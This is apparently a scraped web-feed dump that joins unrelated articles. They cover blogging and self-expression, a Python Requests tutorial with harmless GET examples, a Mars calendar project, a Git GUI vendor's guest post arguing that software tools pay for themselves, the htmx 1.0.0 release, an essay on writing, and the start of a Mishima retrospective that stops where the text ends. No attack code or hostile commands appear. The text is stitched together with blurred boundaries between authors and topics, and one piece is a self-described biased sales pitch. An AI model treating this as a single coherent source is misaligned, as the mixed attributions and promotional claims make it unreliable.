<p>Sometime last week someone tweeted that people make the mistake of writing things that are interesting to themselves – they should write stuff that people want to read. I think that is an unfortunate view, because the world would be so much lesser if everyone only wrote about mainstream topics and no one wrote about niche interests. That view is valid if we’re trying to make a living through our writing…but in this current world, there are very few places in the world one can be truly themselves, and our personal websites should be considered a sacred place where we can be so.</p>



<p>I was clearing my RSS feeds that were accumulated over the course of over ten years, and it was genuinely saddening to me how many websites or blogs do not exist anymore. Because of its digital nature, websites are treated as transient, fleeting. But they have this power to affect people, to open rare windows into people’s personal thoughts and private lives. Social media has somewhat cheapened this because of its velocity and noise. But once upon a time, the internet was a magical place where I derived so much joy, comfort and inspiration from people’s blogs.</p>



<p>I still think the internet is a magical place, just that the magic is buried among the noise. While cleaning my RSS feeds I happened to read <a href="https://kottke.org/20/11/the-moral-calculus-of-covid-19">this beautiful piece</a>. I cannot precisely say why it is beautiful to me, but if I could take a guess perhaps it is the way the writer took what he consumed, thought and felt deeply about them, and expressed those sentiment through picking words and weaving them into sentences the way only he can. Or at least it made me feel that way – that only a person like the writer could have written this piece: it was a piece that was produced through his lens, his filters, his worldview, his language arsenal. A piece writing about a theme everyone is concerned about, but managed to sound profoundly emotive.</p>



<p>It made me want more. Where can I find writing like this? Who are the bloggers writing like this these days? They are probably buried in substack somewhere. Maybe it is too much to ask for writing like this to exist on a public blog for free.</p>



<p>I myself have learned that the force of personal expression must be fiercely guarded. This world is always tempting us to sway. To dilute our voices, our interests, so we can feel like we fit in. It was also on twitter that I found <a href="https://www.lewissociety.org/innerring/">this piece by C.S Lewis</a> on the dangers that come with wanting to fit in and also the reward if only we can break out of it:</p>



<blockquote><p>The quest of the Inner Ring will break your hearts unless you break it. But if you break it, a surprising result will follow. If in your working hours you make the work your end, you will presently find yourself all unawares inside the only circle in your profession that really matters. You will be one of the sound craftsmen, and other sound craftsmen will know it. This group of craftsmen will by no means coincide with the Inner Ring or the Important People or the People in the Know. It will not shape that professional policy or work up that professional influence which fights for the profession as a whole against the public: nor will it lead to those periodic scandals and crises which the Inner Ring produces. But it will do those things which that profession exists to do and will in the long run be responsible for all the respect which that profession in fact enjoys and which the speeches and advertisements cannot maintain.</p><cite>C.S. Lewis, <a href="https://www.lewissociety.org/innerring/">The Inner Ring</a></cite></blockquote>



<p>I like discovering esoteric gems like that even if I don’t fully appreciate it. That is why periodically I still comb twitter as if I was on a beach with a metal detector, even though I have social media fatigue. It is a lot of work to sit in the noise, an effort that is worth it whenever I come across something that changes the way I feel or think about the world.</p>



<hr>



<p>We are 7 billion+ micro-realities interacting with each other:</p>



<blockquote><p>it occured to me that everyone’s inner world is an unmatched micro-reality on its own (it is impossible to have two exact same psyches), which means that there’s 7 billion plus interacting micro-realities walking around in this world. Wow. We affect each other’s reality by the quality of our own inner-reality.</p><cite>– dayone, 1 Sep 2018</cite></blockquote>



<p>The things I choose to write, to observe, to document, to analyse, the way I string together my words, the words I choose — these are all outcomes of every single thing I have experienced in my life. No two people can have the same experience. No two people can interpret their experiences the exact same way. You are the only person in the world who can make something that comes out of <em>your </em>own inner-reality, an outcome of the unique mix-mash of the experiences you have and the media you consume.</p>

<p>That is beautiful and precious, it is not something that can be replicated. It is an opportunity to allow another person to experience you, to experience your inner world, your imagination, in a way that is not possible in a physical interaction. The internet is a place where we as clumsy human beings can translated into art, and I wish the spirit to encourage personal expression (within legal and ethical limits) can be safeguarded.</p>

<![CDATA[An Introduction to Python's Requests Library]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>HTTP requests run the internet. These HTTP requests are made by devices or browsers(clients) when accessing a webpage.</p>

<p>In python, the Requests library allows us to make HTTP requests in our code and this is very key since many modern applications make use of data from third-party services by the use of APIs.</p>

<p>Python Requests is a great library. It allows you to make GET and POST requests with the options of passing URL parameters, adding headers, posting form data, and more.</p>

<p>With the library, you can make requests to almost every website/webpage, but its power lies in accessing APIs to retrieve data in the form of JSON which you can then work with within your code, applications, and scripts.</p>



<h2>Installing the Requests library</h2>

<p>To install the python Requests library, run the command:</p>

<pre><code>pip install requests</code></pre>

<p>This installs the Requests module and dependencies if any.</p>



<h2>Making a simple request with the Requests module</h2>

<p>Let's try to make a simple request to the python website, https://www.python.org ( you can use any website) :</p>

<pre><code>import requests

r = requests.get("https://www.python.org/")</code></pre>

<p>First, we begin by importing the Requests module. From the Requests module, we use a <code>get() </code>function with our website's URL passed in. With that line of code, a request is made to https://www.python.org and the<span> response is saved into the <code>r </code>variable</span>.</p>

<p>Making a request with the Requests module requires an internet connection.</p>

<p>Now we have a <span>Response object, r</span>. We can retrieve all the information we need from this object.</p>

<p>After a request is made, we get a response from the website's server and we can read the server's response code:</p>

<pre><code>r.status_code    # 200</code></pre>

<p>The status response code of 200 indicates a successful request. You can access the source code of the webpage by:</p>

<pre><code>print(r.text)        # prints webpage's source code</code></pre>

<p>The entire source code of the webpage will be printed in your console. This is useful when doing web scraping.</p>



<h2>Making requests to APIs</h2>

<p>By accessing APIs, we can tap into the full functionality of the Requests module. In this tutorial, we will use an API that returns some fake data from <a href="https://jsonplaceholder.typicode.com/">https://jsonplaceholder.typicode.com/posts</a>. The fake data that will be returned represents data of a blog; there are blog posts, users, and comments.</p>

<pre><code>import requests
r = requests.get("https://jsonplaceholder.typicode.com/posts")

print(r.status_code)    # 200</code></pre>

<p>Now, we have a Response object, r. We can retrieve all the information we need from it.</p>

<h2>Response Content</h2>

<p>We can read the content in various ways by using the <span>attributes and functions provided by the Request module</span>.</p>

<pre><code>r.status_code    # 200

r.encoding       # utf-8

r.url            # https://jsonplaceholder.typicode.com/posts

r.json()           # returns the json data

r.text           # returns the sourcecode

r.content        # returns the reponse body as bytes</code></pre>

<p><code>r.status_code </code>returns a code indicating whether a request was successful or not. 200 means successful. Common status codes that you have probably seen are 200, 404, and 500. 404 means client error and 500 means there was a server error.</p>

<p><code>r.encoding</code> returns the encoding of the response based on the HTTP headers.</p>

<p><code>r.url</code> returns the requested URL.</p>

<p><code>r.json()</code> returns a parsed JSON data from the response.</p>

<p><code>r.text</code> returns response is text format</p>

<p><code>r.content</code> returns the response formated in bytes</p>



<h2>Working with JSON response data</h2>

<p>The JSON data returned from <span>https://jsonplaceholder.typicode.com/posts </span>contains a lot of post data, we are going to need only one post data, therefore we will use this URL <span>https://jsonplaceholder.typicode.com/posts/1 </span>which returns only one post.</p>

<pre><code>import requests
r = requests.get("https://jsonplaceholder.typicode.com/posts/1")

print(r.json())</code></pre>

<p><strong>Output:</strong></p>

<pre><code>{'userId': 1, 'id': 1, 'title': 'sunt aut facere repellat provident occaecati excepturi optio
reprehenderit', 'body': 'quia et suscipit\nsuscipit recusandae consequuntur expedita 
etcum\nreprehenderit molestiae ut ut quas totam\nnostrum rerum est autem sunt rem eveniet architecto'}
</code></pre>

<p>Note that this is just some dummy data representing a post/article with a userId, Id, title, and body.</p>

<p><code>r.json()</code> parses the response into a Python-compatible data type i.e a dictionary or list.</p>



<pre><code>import requests
r = requests.get("https://jsonplaceholder.typicode.com/posts/1")

data = r.json()                    # json response is stored in 'data'

post_num = data['id']
user = data['userId']
title = data['title']
body = data['body']

print(f"Post number: {post_num}")
print(f"Written by user: {user}")
print("Title: " + title)
print("---------- Body ----------")                             
print(body)</code></pre>

<p><strong>Output</strong></p>

<pre><code>Post number: 1
Written by user: 1
Title: sunt aut facere repellat provident occaecati excepturi optio reprehenderit
---------- Body ----------
quia et suscipit
suscipit recusandae consequuntur expedita et cum
reprehenderit molestiae ut ut quas totam
nostrum rerum est autem sunt rem eveniet architecto</code></pre>



<h2>Passing URL Parameters</h2>

<p>It is possible to pass parameters in the URL's query string when working with Requests. URL parameters are a common way of passing data, you often see them after the <code>?</code> in a URL. An example is <span>https://www.google.com/search?q=hello</span>&nbsp; this is the URL of google when you search for "hello", therefore the <code>q=hello</code> is the URL parameter.</p>

<p>To pass parameters to the URL, pass the parameters as a dictionary to the <code>params </code>keyword argument. For example; <span>?q=hello</span> will be <span>{'q':'hello'}.</span></p>

<pre><code>import requests

r = requests.get("https://jsonplaceholder.typicode.com/comments/", params={"postId":1})

print(r.url)           # https://jsonplaceholder.typicode.com/comments/?postId=1</code></pre>

<p>You will notice that <code>r.url</code> returns a URL that has automatically appended the parameter to it; <code>?postId=1</code>.</p>



<p><strong>Another Example:</strong></p>

<pre><code>import requests

my_parameters = {"postId":2, "userId":8}

r = requests.get("https://jsonplaceholder.typicode.com/comments/", params=my_parameters)

print(r.url)          # https://jsonplaceholder.typicode.com/comments/?postId=2&amp;userId=8</code></pre>

<p>The keys and values in the <code>my_parameters</code> dictionary,<code> {"postId":2, "userId":8}</code> is converted to <code>?postId=2&amp;userId=8</code> in the final URL.</p>

<p>You can refer to the <a href="https://requests.readthedocs.io/en/master/" target="_blank">Python Requests documentation</a> for reference.</p>

<![CDATA[A Calendar for Mars in the Browswer]]>

November 27, 2020 | https://danieledep.github.io/whole-mars-calendar/ | <a href="https://web.archive.org/web/*/https://danieledep.github.io/whole-mars-calendar/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="info">


  
  
  <p>A dithering playground, a calendar for another planet, a window on the inner solar system, an interactive map, all together. I wanted to learn some front-end libraries but also for curiosity 
    I imagined how a basic tool as the calendar should change on the most hyped planet of the solar system, Mars, where people will have to deal with 
    many hardships and limitations.</p>

    
   
    
  <p>This calendar is similar to ours. A year on Mars has 668 sols, days that span around 24h and 40 minutes, so a martian year roughly doubles our Earth year length, 
    and many people have imagined systems to divide them up. While scientists usually just count the sols from the start of the year and that's it, I think that when you have a continuous settlement it's convenient to have smaller chunks of time for 
    keeping track of repetitive matters. I based the subdivision on the Darian Calendar which divides the Mars Year in 24 months of 28 and 27 sols. The year starts every Vernal equinox, which is
  already the standard for scientists studying the martian seasons. When to count the year Zero from is a debated matter, the Darian Calendar uses 1610, others use 1953 (I did too), I think that when we'll have a continuous human presence it will probably restart from zero anyways.
  </p>

  
  
  <p>
    The martian life will bring heavy constraints to the first settlers: communication, dust storms, oxygen, energy, so to help with the most pressing and time-based of those I added some available information into the calendar. 
    Since any first colony will be still very dependant from Earth, communication with Earth will be super important, but with the distance between the two planets ranging from 100M to 400M kilometers, so the time gap for one-direction communication will vary between 5 and 20 minutes. Just imagine typing a url and wait forty minutes for a response.
    Even more crucial will be the supplies and people coming from Earth, so it will be useful to see in a glance upcoming transfer orbits and in general the positioning of the two planets.  <br>
    In the bottom right box I thought would be useful to have a handy small topographic map of the area of the outpost. Geography is helpful to navigate the rough terrains of Mars, but it also gives insights about one of the most precious resources on Mars: solar light.
    In this interactive map you can drag the marker around the map to see how solar irradiation changes during the seasons and throughout the latitudes.
  </p>
    

    
  

    <p>What started as a small learning project has become something I felt passionate about. I'm actually happy to show it around, 
      but at the same time I feel it could use some polishing (better cartography, better graphics, improved orbit calculations..).
      Also this project could take different shapes, for example I already printed a paper version for my desk!
    I really would like for this project to keep on growing and that would also help me give life to other ideas, so in case you are curious about them too, you can help me make those come true
 by purchasing the pdf version of the next Martian year, which will start on February 2021. </p>

 

 <p>

      It consists of 24 pages one for each month, and in each of them I handpicked the best dithered images I could get. I'm commited to continue to make improvements, 
      so for anybody buying this, I will gift a pdf of the new version when that will be ready. If you are really interested on those paper version of the calendar and the future twists this 
      or other projects will take, please sign up to the mailing list, of course no spammy intentions here.
    </p>

<p><em>“Should I buy this or not?”</em> Ever since the invention of money (and even before that), this very sensible question accompanies our buying decision. And of course not only for cars, handbags, and trampolines – but also when it comes to buying <strong>software tools</strong>.</p>



<p>I’m no expert when it comes to cars, handbags, and trampolines – but as the CEO and founder of “<a href="https://www.git-tower.com/?utm_source=sourcelevel&amp;utm_medium=guestpost&amp;utm_campaign=roi-of-software-tools">Tower</a>” (a desktop GUI for the Git version control system), I have both opinions and some expertise when it comes to SaaS software tools. Of course, my background in a small software company means that I’m highly biased in this matter! But I want to invite you to consider if my <em>arguments</em> might be true, independent of my own bias.</p>



<h2>The ROI of Software Tools is Almost Always Fantastic</h2>



<p>Here is my bold statement: in many cases, <strong>the return on investment is fantastic when it comes to software tools you use for your work</strong>. Let me tell you why I am so convinced that this is true.</p>



<h2>The Benefits of Good Software Tools</h2>



<p>Great software tools come with a host of benefits:</p>



<ol><li><strong>They make you more productive.</strong> For your private purposes, it might be enough if you keep track of tasks you have to do in a simple text file (or even on a piece of paper). But when it comes to your professional work – and especially in a team context – these overly simplistic solutions just won’t cut it. In our team, we are using “<a href="https://www.asana.com/">Asana</a>” to keep track of tasks and projects. And it would be so much harder and cost so much more time if we tried to do this manually! The same logic is true for a tool like “<a href="https://sourcelevel.io/">SourceLevel</a>“: instead of manually pulling together data from various sources, it helps you get a thorough overview of your Pull Request and Code Review metrics quicker and with less effort. <em>Not</em> using these tools – with the intention of trying to save a few bucks – very quickly backfires when it impairs your productivity (and more importantly: the productivity of your whole team)!</li><li><strong>They allow you to do things you couldn’t do without them.</strong> Our own product is a perfect example for this statement: <a href="https://www.git-tower.com/?utm_source=sourcelevel&amp;utm_medium=guestpost&amp;utm_campaign=roi-of-software-tools">Tower, the Git desktop GUI</a> that we make, helps developers to access advanced features of the Git version control system – which, due to the high complexity and steep learning curve of Git, they wouldn’t be able to use (or wouldn’t even be aware of) without Tower. Many software developers claim to know Git. But when it comes to more advanced features like Interactive Rebase, Submodules, or the Reflog, they either don’t know/ don’t use them – or they simply can’t use them efficiently. Anyone who has ever performed an Interactive Rebase operation, with its many manual steps, quickly comes to love Tower, where the same operation is possible via simple drag and drop!</li><li><strong>They reduce mistakes.</strong> I can vividly remember the stress and the anxiety I used to feel when I had to update our website: I would connect to our live server with an FTP program and replace some files with updated versions. This is the equivalent of open heart surgery, which means that a fair amount of stress is not surprising: there are a lot of things that can go wrong and cause a real mess! This whole scenario, for us, lies many years in the past and looks very different from how we do things today: for our marketing websites, we’re using a service called “<a href="https://deploybot.com/">Deploybot</a>” that makes this process a lot easier. And to run the build process for our main Tower app, we’re using the popular “<a href="https://travis-ci.org/">Travis CI</a>” service. Using both of these services (instead of doing things manually) has greatly reduced our error rate – and thereby saved us lots of hours of putting out fires.</li><li><strong>They free your time for more important work.</strong> As the CEO of a small tech company, my schedule is naturally pretty busy. And as anyone knows who has ever tried to find time on <em>multiple</em> people’s calendars: this is really time consuming work! Offering multiple alternative dates that block your calendar for days, looping in multiple people in multiple time zones, and all the back-and-forth emailing connected with this make these things a true nightmare. This is why I’m happily paying a hundred bucks for a yearly subscription of “<a href="https://calendly.com/">Calendly</a>” In a nutshell, this service allows me to share my availability and leave it to the other party / parties to pick a date and time that’s convenient for them. This completely takes away all of the ugly back-and-forth! And on top of that, it allows the other party to choose very freely and conveniently. This has freed up hours of my time that I can now use for more important work!</li></ol>



<hr>



<p>It’s hard to put a concrete dollar value to the above benefits. But if you think <em>any</em> of them through, you will quickly see that many software tools are a true bargain – they make you more productive, allow you to do things you couldn’t do without them, reduce mistakes, and free your time for more important work. All of this makes for a terribly great return on investment!</p>



<h2>Common Objections</h2>



<p>Let’s not ignore the haters, doubters, and nay-sayers and address some common objections.</p>



<blockquote><p>“It’s too expensive!”</p></blockquote>



<p>Let’s take our own tool, the “Tower” Git GUI, as an example.</p>



<ul><li>A license costs between 69 and 99 USD per user per year.</li><li>Our customers are professional software developers in companies large and small as well as freelance programmers.</li><li>The value that Tower delivers is that it makes software developers more productive: it helps them reduce mistakes and get access to the more advanced features that allow them to produce higher-quality software.</li></ul>



<p>The average software developer’s salary varies wildly, but it’s somewhere between 40,000 and 150,000 USD per year. The math here is very simple: if such a tool can help a developer save just <em>a couple of minutes</em> or prevent <em>just 1-2 errors</em> every month – by adding a meager 69 USD to that 40,000 USD yearly cost – the software tool has already paid for itself!</p>



<p>The same argument holds true for almost <em>any</em> knowledge worker: compared to the salaries of well-educated people, the costs of most software tools are extremely low, almost negligible. This means that they earn back their money very quickly! Either in productivity or any of the other benefits that I mentioned above.</p>



<blockquote><p>“I don’t need a tool for that.”</p></blockquote>



<p>It’s true: you <em>can</em> skin a potato with your bare hands and fingernails. But it’s just not very efficient. One reason why humankind has flourished over the millennia is because we have the ability to invent tools. And a potato peeler isn’t very different from a software tool like Tower: you’ll be more productive and get a better end result when using it!</p>



<p>I don’t doubt that you <em>can</em> do lots of things manually, without using a tool. But think carefully if, at least in some cases, there’s a chance that a tool could make things <em>easier</em> and <em>more productive</em>.</p>



<blockquote><p>“The free alternative is sufficient for me.”</p></blockquote>



<p>While you usually have to <em>pay</em> for a potato peeler, software tools are <em>sometimes</em> free: they might be Open Source, or a programmer’s hobby project, or they’re sponsored by a large corporation.</p>



<p>In some cases, such a free piece of software might indeed be an excellent choice (very often the case with Open Source projects). But more often than not, “free” will come with a price tag. Let’s take <strong>quality</strong> as an example: often, quality is not on par with paid alternatives. Why? Because quality costs an immense amount of time and money which both have to come from somewhere! Other examples are non-existent customer support or the lack of good documentation. All of these things, just like the overall “quality” aspect, cost time and money which are often not available in the case of free software.</p>



<blockquote><p>“My boss won’t pay for this.”</p></blockquote>



<p>Dear managers: I hope that reading this far has convinced you that it makes a ton of sense to cover expenses for software tools. If they make your employees just a tiny bit more productive – or if they make their lives a little bit easier – then covering expenses for tools should be a no-brainer. After all, <strong>our job as managers is to provide the people in our teams with everything they need to do good, productive work</strong>.</p>



<h2>A Look at Our Own “Household Spending”</h2>



<p>I started this post by admitting that I’m terribly biased: as CEO of a small software company, it’s probably no surprise that I encourage people to buy <em>our</em> software. However, I’m quite confident that I went beyond <em>our own</em> product and proved that the ROI of software tools <em>in general</em> is often very good.</p>



<p>To prove that we really “walk the walk” (and not just “talk the talk”), here’s an overview of the tools that we spend our own, hard-earned money on:</p>



<figure><img loading="lazy" width="686" height="1024" src="https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-686x1024.png" alt="" srcset="https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-686x1024.png 686w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-201x300.png 201w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-768x1146.png 768w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools.png 842w" sizes="(max-width: 686px) 100vw, 686px"><figcaption>Software Tools Overtable</figcaption></figure>



<h2>It Goes Without Saying: Spend Wisely!</h2>



<p>Of course, all of the above does NOT mean that you should just spend, spend, spend! 💵 Like in other areas of life, you shouldn’t give in to every impulse and just buy any software tool that you come across.</p>



<p>But when it comes to <em>tools for your work</em>, I encourage you to keep your eyes just as much on the “return” part as on the “investment” of the “Return on Investment” consideration. <strong>Don’t hesitate to buy software that brings value!</strong> If it helps you and your team do your jobs better – in a more productive, easier, or safer way – then investing is probably much more clever than being overly frugal.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <h2>htmx 1.0.0 Release</h2>
<p>I'm happy to announce the <a href="https://unpkg.com/browse/htmx.org@1.0.0/">1.0.0 release</a> of htmx.</p>
<p>htmx is now mature enough that I can recommend it as a general replacement for intercooler.js
projects.  I <strong>don't</strong> think there is a strong reason to port an existing intercooler project to
htmx.  I have several large intercooler apps and will not be moving them over any time soon. I can, however, recommend using htmx over intercooler for new projects.</p>
<p>htmx is a different sort of javascript library.  It is an HTML &amp; hypertext-oriented reply to the current dominance of javascript-based SPA libraries.  It is a response to Tom MacWright's question:
<a href="https://macwright.com/2020/10/28/if-not-spas.html">"If not SPAs, What?"</a>.</p>
<p>As the <a href="https://htmx.org/">homepage says</a>:</p>
<ul>
<li>Why should only <code>&lt;a&gt;</code> and <code>&lt;form&gt;</code> be able to make HTTP requests?</li>
<li>Why should only <code>click</code> &amp; <code>submit</code> events trigger them?</li>
<li>Why should only GET &amp; POST be available?</li>
<li>Why should you only be able to replace the entire screen?</li>
</ul>
<p>HTML-oriented web development was abandoned not because hypertext was a bad idea, but rather because HTML didn't have sufficient expressive power.  htmx aims to fix that &amp; allows you to implement <a href="https://htmx.org/examples/">many common modern web UI patterns</a> using the original hypertext model of the web.</p>
<h3>History &amp; Thanks</h3>
<p>htmx began life as <a href="https://intercoolerjs.org/">intercooler.js</a> back in <a href="https://github.com/bigskysoftware/intercooler-js/commit/62d3dbdb5c056ee866aba3575e148de649fc3efe">2013</a>.</p>
<p>In <a href="https://github.com/bigskysoftware/htmx/commit/e38dea64dd1065003a0e833d7b469d24e6bc2919">april</a> of this year I began work on a jQuery-indepenent &amp; improved version of intercoolerjs, renamed
to htmx.  I chose to rename the library because, in working on intercooler, I had come to appreciate that intercooler &amp; htmx were completing HTML as a hypertext rather than just some funky, idiosyncratic javascript libraries.</p>
<p>In <a href="https://github.com/bigskysoftware/htmx/releases/tag/v0.0.1">May</a> htmx reached 0.0.1.  Soon thereafter I had the good fortune of being contacted by <a href="https://twitter.com/ben_pylo">Ben Croker</a>
who was interested in htmx as a base for his new reactive library, <a href="https://putyourlightson.com/plugins/sprig">Sprig</a>.  Ben was willing to be an early adopter of htmx and pushed the library along
much faster than it would have gone otherwise.</p>
<p>I have been very lucky to the have help and feedback from many contributors in <a href="https://github.com/bigskysoftware/htmx/graphs/contributors">Github</a> and on <a href="https://htmx.org/discord">Discord</a>.  I'd like to thank, in particular, <a href="https://github.com/benpate">Ben Pate</a>, <a href="https://github.com/rschroll">Robert Schroll</a> &amp; <a href="https://github.com/jreviews">Alejandro Schmeichler</a> for contributing code as well as new ideas and discussions.</p>
<p>I would like to thank <a href="https://devmode.fm/">Devmode.fm</a> for having me on to <a href="https://devmode.fm/episodes/dynamic-html-with-htmx">talk about htmx</a> and for cleaning up all my "uhhs" and "umms".</p>
<p>Finally, I would like to thank <a href="https://github.com/jsampson">Justin Sampson</a>, who took a lot of time to explain REST &amp; HATEOAS to me and how intercooler (and now htmx) fit into that model for web development.</p>
<h3>Changes</h3>
<ul>
<li>I bumped the version number :)</li>
</ul>
<p>Enjoy!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <h2 id="i">I</h2><p>I, like many other people, have discovered that it is almost impossible to think seriously without writing. Writing clarifies and sharpens your thoughts in a way that is superior to merely articulating them in a conversation. It allows you to look at your ideas more objectively, almost as if they were from another person. You can then examine them and think about if what you have written down is really true.</p><p>However, more often than discovering that your ideas are wrong, you will discover something different: that you do not know what you think. Sure, you have some vague idea, and you believe that there is a chain of reasoning that leads to a certain conclusion. But what you will discover is that this chain of reasoning is mostly not existent. At best, it has many holes and maybe leads not where you think it does. This discovery is, of course, very unpleasant and sometimes even painful. In a sense, you have lied to yourself by thinking you have thought through this specific topic when, in reality, you have only copied the opinion of someone else.</p><p>This process requires an immense amount of honesty because nobody likes to feel stupid. Either you do not know what you think, in which case you feel stupid. Or it turns out that what you believed to be your opinion does not really make sense, is logically inconsistent, and mostly copied from someone else, in which case you feel stupid as well. However, the reward for all this exhausting work is clarity and simplicity. You now possess a chain of reasoning where you have looked as carefully as you can for holes and problems. The next step is to let others examine your reasoning—publishing.</p><h2 id="ii">II</h2><p>I am happy when others enjoy my work and when I can offer a new perspective, but for me, the criticism of my ideas is the most rewarding part of publishing. This is why I recently wrote:</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Don't write to criticize others; write to be criticized by others.</p>— Sven Schnieders (@SvenSchnieders) <a href="https://twitter.com/SvenSchnieders/status/1303074445003812864?ref_src=twsrc%5Etfw">September 7, 2020</a></blockquote>

</figure><p>If you care about being less wrong tomorrow than you are today, you have to take this extreme attitude towards criticism. It will show in your writings and in the way you express your ideas. If you want to be perceived as smart and right, you will articulate your ideas in a moderate way so that others agree with it. (This is one of the main problems I have with contemporary intellectuals who always seem to take the middle ground.) If you are searching for truth, you will articulate the most extreme and radical consequences of your ideas, precisely because others will disagree with them and tell you where your ideas are wrong.</p><p>A good example is a discussion about the distribution of intelligence (not IQ) that I often have with my dad. To crudely summarize the discussion: he believes most people are too stupid to understand complex ideas; for him, this even applies to people who do not recognize the importance of free speech (the real free speech without the “but”). On the other hand, I think that the difference between people’s minds is mostly quantitative (speed and memory) and that almost everyone can understand complex ideas if they take the time and put in the effort; for me, this even applies to, e.g., quantum mechanics.</p><p>I do not want to get into the discussion (that’s a different essay, and it is more nuanced than I portrayed it here), but note how radically different our positions are. It is because we both put forward the most extreme consequence of our theories. If he or I cared about finding a consensus and about looking correct, we could have used different examples: he could have said that people cannot understand complex systems like capitalism, and I could have said that people are capable of understanding even classical physics.</p><p>Notice that the disagreement looks way less severe using these examples. Some people might even argue that understanding how capitalism works is more difficult than understanding classical physics. It feels as if we are way closer to a compromise or to finding a common ground. But in reality, were are just further away from finding the truth because our disagreement is not as clear and obvious as it could be, which leads to worse criticism.</p><h2 id="iii">III</h2><p>This way of expressing ideas can sometimes be perceived as rude because, in contrast to most other people, you are not searching for consensus but for the truth. However, it is not a form of arrogance to express the most extreme consequences of your ideas; it is a form of intellectual honesty. In this way, your ideas are widely open to criticism, and you are therefore more likely to learn something. You are also more likely to look stupid, but that is a price you must be willing to pay.</p><h2 id="iv">IV</h2><p>The inherent fuzziness of conversations makes it difficult to notice gaps in your understanding and reasoning. This applies both to your conversation partner and to yourself.</p><p>Having a conversation with someone else about your ideas is only superior to writing about them under two conditions. First, if you have already thought about your ideas on the topic a lot and have carefully examined your chain of reasoning, which, as I have already explained, is best done in writing. And second, if the other person is smart, has thought about the topic a lot as well, and values truth over consensus. If, and only if, both of these conditions are met, a conversation can be more fruitful in sharpening your ideas than writing about them. There are other advantages to conversations with regards to creativity, thought-provoking impulses, and inspiration, but for thinking deeply about a topic, writing is superior to a conversation.</p><h2 id="v">V</h2><p>Anyone who reads books that are commonly known as <em>the classics</em> will be somewhat discouraged from publishing their writing because these people were so smart. Every idea you come up with has probably been expressed better by someone else (most likely even by Plato because, as some say, <a href="https://www.age-of-the-sage.org/philosophy/footnotes_plato.html">all of western philosophy is merely a series of footnotes to his works</a>). Put differently by Allen Farrington:</p><blockquote>“The classics are classic because those people were a lot smarter than us and we kinda wish they were still around telling the rest of us idiots what to do.”</blockquote><p>Although I whole hardheartedly agree with this sentiment and might one day decide to write up my thoughts on why I think we are “stupider” than our ancestors, it does not have to be demotivating. In fact, it is quite the opposite. Recognizing that our contemporary intellectuals are, let’s just say, “not up for the task” should be a motivation for everyone else. I think the question,</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Have the smart people always been this stupid?</p>— Heather E Heying (@HeatherEHeying) <a href="https://twitter.com/HeatherEHeying/status/1327124783365021696?ref_src=twsrc%5Etfw">November 13, 2020</a></blockquote>

</figure><p>should be answered with a resounding no. We are standing on the shoulders of giants, being mostly unworthy of the great works of the past. But it does not mean that we cannot make ourselves worthy. You (and I) may not possess the courage of Nietzsche or the wisdom of Plato, but it is our responsibility to breathe new life into their thoughts—to think them further—and since they are not around, there is no point in being discouraged.</p><h2 id="vi">VI</h2><p>Do not compare yourself to the classics; they are dead and cannot solve our problems for us. If you need confidence, compare yourself to contemporary intellectuals, and you will see that society needs all the help it can get. Remember, “<a href="https://en.wiktionary.org/wiki/in_the_land_of_the_blind,_the_one-eyed_man_is_king">in the land of the blind, the one-eyed man is king,</a>” and one thing is certain: there are very few two-eyed men left.</p><p>Every time I get disappointed in my ability to think and articulate my thoughts, which happens frequently, I look at contemporary intellectuals and remember Bukowski’s words:</p><blockquote>“I had to continue because they were so bad, not because I was so good; and I’m still not so good, but they’re still very bad.”</blockquote><h2 id="vii">VII</h2><p>This essay is my way of saying: Start writing! You will learn as much about the topic as about yourself. You will be shocked by how often you trick yourself into falsely thinking that you have understood something. You will write and think, “Oh, is this why I think that? I didn’t know that.” </p><p>The process is exciting, challenging, scary, and sometimes painful, but above all, it is worth it. And one day, you and I might be able to read the great works of the past and feel that we have honored their achievements by keeping their ideas alive, and maybe we have even managed to think some of them further.</p><p>Thank you for reading my essay.</p>

			<p>Published in <a href="https://asia.nikkei.com/Editor-s-Picks/Tea-Leaves/Yukio-Mishima-in-the-21st-century" target="_blank">Nikkei Asia 23/11/2020</a></p>
<p>Can you imagine best-selling novelist Haruki Murakami leading a coup attempt against Japanese Prime Minister Yoshihide Suga? Or Booker Prize winner Ian McEwan taking a top general hostage in a British army base and inciting a rebellion against Boris Johnson’s government? Or any of the legions of writers and artists who regularly hammered President Donald Trump on social media choosing to die for their cause?</p>
<p>Probably not, but that would be the modern equivalent of what happened on Nov. 25, 1970, when the brilliant Japanese novelist Yukio Mishima and four accomplices invaded the office of the commander of Japan’s Self-Defense Forces, called on his troops to topple the government of Prime Minister Eisaku Sato, and then committed <em>seppuku</em>, or ritual disembowelment (vulgarly known as <em>hara-kiri</em>).<a href="http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima.jpg"><img src="http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-460x612.jpg" alt="NARMishima" width="460" height="612" srcset="http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-460x612.jpg 460w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-768x1022.jpg 768w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-395x525.jpg 395w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-436x580.jpg 436w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima.jpg 1503w" sizes="(max-width: 460px) 100vw, 460px"></a></p>
<p>Mishima had been nominated three times for the Nobel Prize for Literature, but he was not just a writer. He was a major celebrity in Japan, the first to be described as a <em>supasuta</em> (superstar) by the media, and one of the best-known Japanese writers abroad. In the late 1960s the magazine <em>Heibon Punch</em> nominated him the “coolest male” in Japan in its “Mr. Dandy” awards, ahead of movie star Toshiro Mifune and baseball hero Shigeo Nagashima.</p>
